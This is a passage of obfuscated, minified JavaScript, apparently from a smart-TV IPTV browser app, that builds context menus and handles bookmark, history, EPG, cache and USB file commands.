if((ch.playlist_url+ch.stream_url).indexOf("no_save")>=0)kjtYpr.inf("_FPCopied denied by author playlist_!",2500);else if(s.indexOf(ch.playlist_url+ch.stream_url)!=-1&&ch.parser==""){kjtYpr.inf(ch.title.substr(0,15)+" - _FPZaklUzheEst_ "+pl_title,1000)}else{var obj=cleanCh(ch);if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",obj,count++);if(n=="bookmarks/addnew")break}else{data["cha"+"nnels"].unshift(obj);kjtYpr.lll0Il11OxICbl1ll0Ypr(n,llIl1I1HlMgNII1IO0Ypr(data));lOI11II0lfSYLUllI11IYpr();kjtYpr.inf("_FPDobavlenoV_ "+pl_title,1000)}}
if(getSelect()<0)break}}}catch(e){console.log(e)}
favarray=null;curPage.is_mark=!1;oInset[insetActive].focused();handler="menu";break;case "cmdMove":try{var n=Menu[llQI1IlixJG1OIIIYpr][3];var pl_title=kjtYpr.GL[n];var s=kjtYpr.l1O0l1gmmv01O11Ypr(n);if(!curPage.is_mark){curPage.is_mark=!0;curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
if(n.indexOf("bookmarks/")!=0){var dataTo=l0QO11lOz0bfh10l0Ypr(s);if(dataTo==null)dataTo={"channels":[]}}
if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")!=0)var data=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr(gP("lIQ0Il1IlIb1Il1OYpr")));for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]=="1"){if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",curPage.channels[i])}else dataTo["cha"+"nnels"].unshift(curPage.channels[i])}}
var k=0;var ln=curPage.channels.length;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lIQ0Il1IlIb1Il1OYpr"),"cmdDel",(i-k))}else data["chan"+"nels"].splice(i-k,1);k++}}
if(n.indexOf("bookmarks/")!=0)kjtYpr.lll0Il11OxICbl1ll0Ypr(n,llIl1I1HlMgNII1IO0Ypr(dataTo));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")!=0)kjtYpr.lll0Il11OxICbl1ll0Ypr(gP("lIQ0Il1IlIb1Il1OYpr"),llIl1I1HlMgNII1IO0Ypr(data));if(n.indexOf("bookmarks/")!=0)kjtYpr.inf("_FPPeremV_ "+pl_title,1000);curPage.is_mark=!1}catch(e){console.log(e)}
handler="menu";oInset[insetActive].reload();break;case "cmdDel":var n=gP("lIQ0Il1IlIb1Il1OYpr");if(getSelect()==-2)n="bookmarks/toolbar";console.log("del from "+n);var data=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr(n));if(curPage.is_mark){var k=0;var ln=curPage.channels.length;var count=0;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")==0){if(n=="bookmarks/extbookm"){setTimeout('xhr_bookmark("bookmarks/extbookm","cmdDel",'+i+');',++count*100)}else xhr_bookmark(n,"cmdDel",i-k,count++)}else data["chan"+"nels"].splice(i-k,1);k++}}
curPage.is_mark=!1}else{if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,cmd,getSelect())}else data["chan"+"nels"].splice(getSelect(),1)}
handler="menu";if(n.indexOf("bookmarks/")==0){Ill1110().replace(data["chan"+"nels"])}else{kjtYpr.lll0Il11OxICbl1ll0Ypr(n,llIl1I1HlMgNII1IO0Ypr(data));Ill1110().replace(xhr_bookmark(n).channels);kjtYpr.inf("Удалено!",1000)}
break;case "cmdClearHistory":console.log("clear hist");kjtYpr.lll0Il11OxICbl1ll0Ypr("history","");l1OII11MlI01IYpr=[];kjtYpr.inf("_FPIstOchishena_!",1000);handler="menu";oInset[insetActive].reload();break;case "cmdClearhistsearch":kjtYpr.lll0Il11OxICbl1ll0Ypr("searches","");kjtYpr.inf("_FPIstOchishena_!",1000);curPage.channels=[];handler="menu";oInset[insetActive].focused();break;case "cmdClearhisturl":kjtYpr.lll0Il11OxICbl1ll0Ypr("enteres","");kjtYpr.inf("_FPIstOchishena_!",1000);curPage.channels=[];l11II1_JfwgOlIl1Ypr=Math.random();handler="menu";oInset[insetActive].focused();break;case "cmdForkStore":if(user!=null){autoexport("user")}
if(TS==1){autoexport("store")}else{if(is_tizen)document.location="http://smart.obovse.ru/?do=forktizen";else document.location="http://smart.obovse.ru/?do=fork"}
break;case "cmdlaunchFullScreen":launchFullScreen(document.getElementsByTagName('body')[0]);break;case "cmdExit":handler="menu";if(TS==1){autoexport("user");autoexport();setTimeout("closeapp();",2000)}else if(user!=null){autoexport("user");setTimeout("closeapp();",2000)}else closeapp();break;default:handler="menu";break}};function stmot(s){if(s==60)return"60s (_FPOtkl_)";else return s+"s"}
function shint(s,s2){if(s2!=null){if(s2=="p"){if(s=="")return"_FPOtkl._";else return s.replace(/./g,"*")}
if(s2=="a"){if(s==0)return"_FPOtkl._";if(s==1)return"_FPVkl._ (auto)";if(s==2)return"_FPVkl._ (Audio _FPpleer_)";if(s==3)return"_FPVkl._ (Html5 _FPpleer_)";if(s==4)return"_FPVkl._ (Media _FPpleer_)"}
if(s2==7){if(s==0)return"_FPOtkl._";else return"#"+s}
if(s2=="1")return"FS";else return"CXZ"}
if(s==12)return"_FPVkl._ (Rus - Eng)";else if(s==11)return"_FPVkl._ (Eng - Rus)";else if(s==13)return"_FPVkl._ (_FPManually_)";else if(s==3){if(kjtYpr.GL.remoteip=="")var ds="_FPEnter_ IP:PORT";else ds=kjtYpr.GL.remoteip;return"_FPManually_ "+ds}else if(s==2)return"_FPAuto_";else if(s==1)return"_FPVkl._";else if(s==0||s==10||s==20||s==40||s=="")return"_FPOtkl._";else if(s==21)return"_FPTolko_ IPTV";else if(s==22)return"_FPDlyaVsV_";else if(s==30)return"_FPLocal_";else if(s==31)return"_FPOn Server_";else if(s==32)return"_FPOtkl_";else if(s==41)return"_FPPercent_";else if(s==50)return"_FPAuto_";else if(s>50&&s<70)return"_FPServer_ "+(s-50);else if(s==70)return"_FPpoumolch_";else if(s==71)return"V"+"K_RED";else if(s==72)return"V"+"K_GREEN";else if(s==73)return"V"+"K_YELLOW";else if(s==74)return"V"+"K_BLUE";else if(s==75)return"V"+"K_LEFT (только в списках)";else return s}
kjtYpr.Edit=function(n,cmd){console.log(n);var curPage=gP();var select=getSelect();if(ll0l0loMtIlIOYpr(n)){console.log(curPage.channels);console.log("move start "+getSelect());var ch=curCh();var oldselect=getSelect();if(cmd=="up")oInset[insetActive].posStart(0,-1);else if(cmd=="down")oInset[insetActive].posStart(0,1);else if(cmd=="left")oInset[insetActive].posStart(-1,0);else if(cmd=="right")oInset[insetActive].posStart(1,0);if(curPage.channels[oldselect].source!="fav"||curCh()["source"]!="fav"){oInset[insetActive].focused(oldselect);kjtYpr.popUp("_FPMove only Favorites_!",1000);return}
if(getSelect()<0)setSelect(0);if(oldselect!=getSelect()){console.log("move add");var t=getVars("start");var tmp=t.fav[curPage.channels[oldselect].id];t.fav[curPage.channels[oldselect].id]=t.fav[curCh()["id"]];t.fav[curCh()["id"]]=tmp;setVars("start",t);handler="menu";curPage.channels=getVars("start").channels;Ill1110().replace(curPage.channels);handler="move";return}}
var data=xhr_bookmark(n),sel=null;if(cmd=="up")var selnew=select-1;else if(cmd=="down")selnew=select+1;else if(cmd=="left")selnew=select-10;else if(cmd=="right")selnew=select+10;else selnew=null;if(selnew!=null){if(selnew<0)selnew=data.channels.length-1;else if(selnew>data.channels.length-1)selnew=0;if(selnew!=select){var x=data.channels[select];data.channels[select]=data.channels[selnew];data.channels[selnew]=x;xhr_bookmark(n,"update",data);setSelect(selnew);Ill1110().replace(data.channels)}}};function lIl11llQV1Z1NOO0IYpr(n,y){var res=0;var s=kjtYpr.GL.fs;if(s==null)s="";if(s.length>8)res=Number(s.substr(n,1));if(isNaN(res))res=0;if(n==1)res=0;if(s.substr(12,1)=="1"){if(n!=12&&n!=6)res=1}
if(y==null)return res;else if(y==1)return["Да","Нет"][res];else if(y==0)return["Нет","Да"][res];else return y[res]}
function FsetSetting(n,v){var d=lIl11llQV1Z1NOO0IYpr(n);if(v==null){if(++d>1)d=0}else d=v;var s="";for(var i=0;i<15;i++){if(i==n)s+=String(d);else s+=String(lIl11llQV1Z1NOO0IYpr(i))}
kjtYpr.GL.fs=s;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))}
function set_epg(epg_region){console.log("set epg");var data={"title":t+"EPG"};var ch=curCh();if(ch.title.indexOf("<div")==0&&ch.description!=null)var tl=ch.description.substr(0,ch.description.indexOf("<br"));else tl=ch.title;if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("?list=")>0){tx=unescape(gP("lIQ0Il1IlIb1Il1OYpr").split("?list=")[1])}else tx=gP("lIQ0Il1IlIb1Il1OYpr");data["chan"+"nels"]=[{"logo_30x30":"","title":"_FPSteret_","stream_url":"setEpg|-"+tl+"|-"+tx+"|-"}];if(gV(epg_region)==""){epg_tl=tl;epg_tx=tx;data["chan"+"nels"].push({"logo_30x30":"","playlist_url":"cmdEpgRegionmain","title":"UA, RU, BY"});for(j in JtvEF){data["chan"+"nels"].push({"logo_30x30":"","playlist_url":"cmdEpgRegion"+j,"title":j.toUpperCase()})}}else{if(epg_region=="main")JtvArr=JtvE;else JtvArr=JtvEF[epg_region];for(var i in JtvArr){data["chan"+"nels"].push({"logo_30x30":"http://"+getJserv()+"/common/img/"+i+".png","description":"EPG CODE: "+i,"jtvname":i,"title":(i.indexOf(".")>0)?JtvArr[i]+"."+i.split(".")[1]:JtvArr[i],"stream_url":"setEpg|-"+epg_tl+"|-"+epg_tx+"|-"+i+"|-"+epg_region})}}
handler="menu";OpenUrl(data,gP("lIQ0Il1IlIb1Il1OYpr")+"#epg")}
var copyUsb="",copyUsbNames="",copyUsbMode=0;kjtYpr.l1Q1OIO0duul1l1IlYpr=function(m,menu){llQI1IlixJG1OIIIYpr=0;if(m==null)m="";Menu=Array();var curPage=gP();var ch=oInset[insetActive].curCh();if(menu!=null)ch={"menu":menu,"playist_url":""};console.log(ch);if(m=="topmenu"){var dop="";if(user==null)dop="_FPProfile_<br><span style='font-size:70%;color:#d1d1d1;padding-left: 29px;'>_FPSign in to sync browser data across devices_</span>";else{var dop="_FPProfile_ "+user.login;if(gV(timestamp)<3)dop+="<br><span style='font-size:70%;padding-left: 29px;color: #ff9800; padding-left: 29px; font-weight: bold;'>_FPДля Вас есть информация в Профиле_</span>"}
Menu.push(Array(llQI1IlixJG1OIIIYpr++,dop,function(){oInset[insetActive].navigate("http://cloudflare.appinfo.su/browseraccount/")}));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNew inset_","cmdNewInset"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNew private inset_","cmdNewInsetPriv"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNastrGlPoisk_","cmdGoURL","about:configsearch"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNastroiki_","cmdGoURL","about:settings"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Контакты и Условия использования","cmdGoURL","about:info"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPZakladki_ / _FPIstoriya_ / Сохраненные страницы","cmdGoURL","about:favorites",_img("_ST_zakl.png")));tts="_FPVijtiV_ Fork Store";if(is_tizen)tts+=" (HTML5)";if(uaJ!="mag"&&uaJ!="dune"&&!is_tizen&&platform!="android-device")Menu.push(Array(llQI1IlixJG1OIIIYpr++,tts,"cmdForkStore"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPEXIT_","cmdExit"))}else if(m=="favmenu"){if(gP("SEARCH_TEMPL")!=""){var ex=l01llO0sYbDOI1OIYpr(gP("SEARCH_TEMPL"));if(ex>=0){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPEdit in Search engines_",function(){OpenUrl("about:configsearch#edit:sites:"+ex)}))}else{Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavVglob_",function(){try{var x=oInset[insetActive].history[oInset[insetActive].history.length-1]}catch(e){x={"title":"","img":gP("parentCh")["logo_30x30"]}}
var ttl=x.title+" "+gP("parentCh")["title"];var u=gP("SEARCH_TEMPL");if(typeof gP("parentCh")["search"]=="object"){if(gV(gP("parentCh")["search"],"title")!="")ttl=gV(gP("parentCh")["search"],"title");if(gV(gP("parentCh")["search"],"icon")!="")x.img=gV(gP("parentCh")["search"],"icon")}
oInset[insetActive].navigate({"playlist_url":"about:configsearch#edit:sites:new","new":{"title":ttl,"logo":x.img,"url":u}})}))}}else{Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ _FPStartovoeMenu_","cmdToStart"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ _FPBookmark toolbar_","","bookmarks/toolbar"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ _FPzakladki_","Bookmarks"));if(lastBookm.url!="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ "+lastBookm.title,"",lastBookm.url))}}else if(getSelect()==-2){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPUdalit_ _FPizZakladok_","cmdDel"))}else if(getSelect()==-1&&m==""){if(oldinset!=null&&m!="favmenu"){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOpen closed tab_","cmdOpenInsetClose"))}
if(insetSelect==insetActive&&!ll0l0loMtIlIOYpr()){if(insetIn(-1,"get","b")=="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPZablVkl_","cmdInsetBlock"));else Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPRazblVkl_","cmdInsetBlock"));if(insetIn(-1,"get","a")=="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPUstSart_","cmdInsetStart"));else Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPUdIzSt_","cmdInsetStart"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPObnovitStranicy_","cmdReload"))}else if(oldinset==null)return}else if(submenuSelIcon.selicon){if(submenuSelIcon.title.indexOf("--")>0)var title=submenuSelIcon.title.split("--")[1];else title=submenuSelIcon.title;Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPSetIconFor_ \""+title.substr(0,8)+"\"","cmdSetIcon",curCh("logo_30x30")));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOtmena_","cmdSetIcon","cancel"))}else{if(typeof ch.menu=="object"){if(m=="onlymenu"){Menu=[]}
for(var i in ch.menu){Menu.push(Array(llQI1IlixJG1OIIIYpr++,ch.menu[i].title,function(a){console.log("mi="+a);if(curPage.is_mark){curPage.is_mark=!1;for(var j=0;j<curPage.channels.length;j++){if(curPage.is_mark_array[j]=="1"){console.log(curPage.channels[j].menu[a]);oInset[insetActive].navigate(curPage.channels[j].menu[a])}}}else{console.log(ch.menu[a]);oInset[insetActive].navigate(ch.menu[a])}},i,ch.menu[i].logo_30x30))}}
if(m!="onlymenu"){if(gV(ch,"playlist_url")!="cmdmenu")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOpen_",function(){OpenUrl()}));if(oInset[insetActive].get("b")!="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPRazblVkl_","cmdInsetBlock"));if(l0I110IO1SyqII1lI1Ypr){if($_("vk_audio").style.display=="block"){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Управление аудио","cmdAudio"))}}
if(gP().lIQ0Il1IlIb1Il1OYpr.indexOf("wlist.php?id")>0){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPRun widget_",function(){confirmed.create("Open application in 1280х720","Run appliction");confirmed.fun0=function(){var u="http://obovse.ru/widget/tmp/"+ch.playlist_url.substr(6)+"/index.html"+location.search;document.location=u}}));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Установить с заменой","cmdRewrite"))}
if(curPage.channels.length>0){if(ll0l0loMtIlIOYpr()){if(gV(ch,"source")=="fav"){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPPeredvinut_","cmdUp"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDeleteFromStartMenu_","cmdDelFromStart"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPEdit_","cmdEdit"))}else if(gV(ch,"source").match(/(usertop)/)){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Перенести в Избранные ","cmdToStart"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Удалить из истории","cmdDelFromStart"))}else if(gV(ch,"source").match(/(top|third|service)/)){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Перенести в Избранные ","cmdToStart"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Скрыть","cmdDelFromStart"))}}
if(chGroup.length>0){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPCategorys_","cmdGroup"))}
if(!ll0l0loMtIlIOYpr()&&gV(ch,"playlist_url").match(/^(bookmarks|zakladki)/)){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPEdit_","cmdEdit"))}
if(gP().is_iptv>2){if(typeof ch.epg!="undefined")var t=" ("+ch.epg+")";else t=" (_FPustanovit_)";Menu.push(Array(llQI1IlixJG1OIIIYpr++,"ЕПГ код"+t,function(){set_epg()},null,_img("_ST_epg.png")))}
if(apijsUrl!="")if(payd.user!="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Выйти с аккаунта "+payd.user,"cmdClearprov","provUser"));if(gV(ch,"stream_url")!=""&&!curPage.is_mark){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOpen with_",function(){var m=[];for(var i in exAll){m.push({"title":sPlayer[exAll[i]],"icon":_img("_ST_"+sIconPlayer[exAll[i]]),"args":exAll[i],"cmd":function(a){console.log("op with "+a);oInset[insetActive].navigate(ch,a);return 1}})}
showSubMenu(null,m);return 1},null,null,"right"));if($_("titleid"+getSelect()).style.textDecoration=="line-through")var t="_FPOtmNeProsm_";else t="_FPOtmProsm_";Menu.push(Array(llQI1IlixJG1OIIIYpr++,t,function(){if(ftimes==null)ftimes={};if(typeof ftimes[getIdent()]!="undefined")delete ftimes[getIdent()];else ftimes[getIdent()]=[1,1];kjtYpr.lll0Il11OxICbl1ll0Ypr("times",llIl1I1HlMgNII1IO0Ypr(ftimes));set_times(!0);handler="menu"},null,_img("_ST_cmdTimes.png")));if(is_img(ch.stream_url))Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPSetFon_",function(){kjtYpr.lll0Il11OxICbl1ll0Ypr("mf",ch.stream_url);FXMLPage.lIlO1OI1Mlt001lIYpr();kjtYpr.popUp("Фоном установлена ссылка:<br>"+ch.stream_url+"<br>Поменять фон можно в Настройках")}))}
if(gV(ch,"search_on")!=""){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavVglob_",function(){try{var x=oInset[insetActive].history[oInset[insetActive].history.length-1]}catch(e){x={"title":"","img":ch.logo_30x30}}
var ttl=x.title+" "+ch.title;var u=ch.playlist_url;if(typeof ch.search=="object"){if(gV(ch.search,"title")!="")ttl=gV(ch.search,"title");if(gV(ch.search,"icon")!="")x.img=gV(ch.search,"icon");if(gV(ch.search,"playlist_url")!="")u=gV(ch.search,"playlist_url")}
FXMLPage.addGl(u,null,ttl,x.img)}))}
if(gP("lIQ0Il1IlIb1Il1OYpr").match(/^(zakladki|bookmarks)/)){if(!curPage.is_mark)Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPPeredvinut_","cmdUp"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPUdalit_ _FPizZakladok_","cmdDel"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPPeremV_ ","cmdMoveBookmarks"))}
if(!gP("lIQ0Il1IlIb1Il1OYpr").match(/^(about:settings)/)){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPObnovitStranicy_","cmdReload"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPSource code_","cmdGoURL","view-source:"+gP("lIQ0Il1IlIb1Il1OYpr")));if(curPage.is_mark){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPMark_ _FPvse_",function(){for(var i=0;i<curPage.channels.length;i++)curPage.is_mark_array[i]=1;oInset[insetActive].focused()}));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDese"+"lect_",function(){curPage.is_mark_array={};oInset[insetActive].focused();curPage.is_mark=0}))}else{Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPMark_ _FPseveral_",function(){curPage.is_mark=1;OpenUrl()}))}
if(curPage.global.player=="inner"){}else{Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ _FPzakladki_","Bookmarks"));if(lastBookm.url!="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ "+lastBookm.title,"",lastBookm.url))}
if(gP().is_iptv>2){if(gV(ch,"order")!="")var st=" (Major: "+ch.order+")";else st="";Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPSorting_"+st,"cmdSorting"))}}
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPDobavitV_ _FPStartovoeMenu_","cmdToStart"))}else Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPPolnSbrosNastr_","cmdReset"));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("about:history")!=0)
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPIstoriya_ / Кеш","cmdHistory"));else Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOchistitIstoriyu_","cmdClearHistory"));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("about:histurl")==0||gP("lIQ0Il1IlIb1Il1OYpr").indexOf("about:histsearch")==0)
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPOchistitIstoriyu_","cmdClear"+gP("lIQ0Il1IlIb1Il1OYpr")));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("no_save")==-1&&gV(curPage.global,"player")!="inner")
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPSave page to cache_",function(){console.log("save to cache");if(lIIOl1I0QUB_llIOYpr(null,!0))kjtYpr.inf("OK!",1200);else kjtYpr.inf("Error!",1200);handler="menu"}));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("about:cache")==0)Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPClear cache_",function(){kjtYpr.lll0Il11OxICbl1ll0Ypr("prev_cache","");kjtYpr.inf("Cache clear OK!",1000);handler="menu";oInset[insetActive].reload()},null,_img("_ST_delete.png")));if(!ll0l0loMtIlIOYpr()&&kjtYpr.GL.lang!="ru")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPTranslate_ "+kjtYpr.GL.lang,"cmdTranslate"));if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("about:settings")!=0){if(!ll0l0loMtIlIOYpr())Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNaitiVglobPoiske_...","cmdSearch"));if(!ll0l0loMtIlIOYpr())Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Рецензии и фильмография...",function(){var data={"title":"Поиск фильмографии и рецензий на кинопоиске: "};data["chan"+"nels"]=[];if(oInset[insetActive].history.length>1){var ttl=oInset[insetActive].history[oInset[insetActive].history.length-1].title.split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":"http://st.kp.yandex.net/images/logoWhite.png","title":s,"playlist_url":"http://p.lnka.ru/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}}
ttl=ch.title.replace(/\s+/g," ").split(" ");if(ttl.indexOf("<div")==0){ttl=ch.title.match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с)/ig," ").replace(/\s+/g," ").split(" ");console.log("ttl="+ttl)}
var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":"http://st.kp.yandex.net/images/logoWhite.png","title":s,"playlist_url":"http://p.lnka.ru/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}
handler="menu";OpenUrl(data,"usb://"+gP("lIQ0Il1IlIb1Il1OYpr")+"#kinopoisk")}));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPNastroiki_","cmdMenuSettings"))}
if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("usb:/")==0||(platform=="sams"&&curCh("stream_url")!="")){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPKopirovat_",function(){var ss="",ssn="";markedObj.entries(function(ch,n){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.indexOf("md5hash")!=-1){kjtYpr.inf("_FPNeedToOpenAndCloseTheVideoPlayerThenRepeatCopying_!",1500);handler="menu";return}
if(ss!="")ss+="-|-";ss+=s;if(ssn!="")ssn+="-|-";ssn+=ch.title});markedObj.cancel();copyUsb=ss;copyUsbNames=ssn}));if(gP("lIQ0Il1IlIb1Il1OYpr")!="usb://"&&gP("lIQ0Il1IlIb1Il1OYpr").indexOf("usb:/")==0){if(copyUsb!="")Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPVstavit_",function(){s=gP("lIQ0Il1IlIb1Il1OYpr").replace("usb://","").replace("xml://","");copyUsbMode=0;numret=0;if(s.length>0){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPWhileCopyingFilesCannotViewVideoAndAudio_");pasteFile(copyUsb,s,copyUsbNames)}
copyUsb="";setTimeout("oInset[insetActive].reload();",850)}));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"<font color=red>_FPUdalit_</font>",function(){confirmed.create("_FPAre you sure_?","_FPUdalit_").fun0=function(){markedObj.entries(function(ch,n){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.length>0)usbDelete(s)});oInset[insetActive].reload()};markedObj.cancel()},null,_img("_ST_delete.png")))}}
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPZakladki_","cmdGoURL","about:favorites",_img("_ST_zakl.png")));if(kjtYpr.GL.remote>0){Menu.push(Array(llQI1IlixJG1OIIIYpr++,"Обновить сост. RemoteFork","cmdRemoteUpdate"))}
tts="_FPVijtiV_ Fork Store";if(is_tizen)tts+=" (HTML5)";if(uaJ!="mag"&&uaJ!="dune"&&!is_tizen&&platform!="android-device")Menu.push(Array(llQI1IlixJG1OIIIYpr++,tts,"cmdForkStore"));Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPEXIT_","cmdExit"))}}
if(Menu.length==0){kjtYpr.inf("Empty menu!",1200);return}
Menu.push(Array(llQI1IlixJG1OIIIYpr++,"_FPCancel_","cmdCancel"));var l1II1IlOORHvj11O1Ypr="";for(var index=0;index<llQI1IlixJG1OIIIYpr;index++){var m_img="";if(gV(Menu[index],4)!="")m_img=Menu[index][4];else if(typeof Menu[index][2]=="string"){if(Menu[index][2]=="cmdMenuSettings")m_img="/insetM"+"enu.png";else if(Menu[index][2]=="cmdSettings")m_img="/settings.png";else if(Menu[index][2]=="cmdExit")m_img="/exit.png";else if(Menu[index][2]=="cmdUp")m_img="/move.png";else if(Menu[index][2]=="cmdRemoteUpdate")m_img=$_("remotesrc").src;else if(Menu[index][2]=="extmedia")m_img="/extmedia.png";else if(Menu[index][2]=="exthtml5")m_img="/exthtml5.png";else if(Menu[index][2]=="cmdGroup")m_img="/group.png";else if(Menu[index][2]=="cmdExtopen")m_img="/extbookm.png";else if(Menu[index][2]=="cmdSetStart")m_img="/cmdSetStart.png";else if(Menu[index][2]=="cmdSorting")m_img="/sort.png";else if(Menu[index][2]=="cmdForkStore")m_img="/exittostore.png";else if(Menu[index][2]=="cmdSearch")m_img="/search.png";else if(Menu[index][2]=="cmdSearchKinopoisk")m_img=""+"/recenzii.png";else if(Menu[index][2]=="cmdMail")m_img="/mail.png";else if(Menu[index][2]=="cmdEdit")m_img="/edit.png";else if(Menu[index][2]=="cmdDonate")m_img="/donate-button.png";else if(Menu[index][2]=="cmdOpenStart")m_img="/b/d.png";else if(Menu[index][2]=="Bookmarks")m_img="/addzakl.png";else if(Menu[index][2]=="cmdReload")m_img="/reload.png";else if(Menu[index][2]=="cmdTranslate")m_img="/translate.png";else if(Menu[index][2].indexOf("cmdDel")==0)m_img="/delete.png";else if(Menu[index][2]=="cmdHistory")m_img="/history.png";else if(Menu[index][2]=="cmdToStart")m_img="/addtostart.png";else if(Menu[index][2]=="cmdSelect"||Menu[index][2]=="cmdSelectAll")m_img="/sele"+"ct_all.png";else if(Menu[index][3]=="vadd")m_img="/addzakl.png";else if(Menu[index][3]=="vdel")m_img="/delete.png";else if(Menu[index][2]=="cmdDelFromStart")m_img="/delete.png";else if(Menu[index][3]=="lock")m_img="/lock.png";else if(Menu[index][3]=="unlock")m_img="/unlock.png";else if(Menu[index][3]=="bookmarks/toolbar")m_img="/addzakl.png";else if(Menu[index][2]==""&&typeof lastBookm.logo_30x30!=undefined)m_img=lastBookm.logo_30x30;else if(Menu[index][2]=="cmdSetIcon"&&Menu[index][3]!="cancel")m_img=Menu[index][3]}
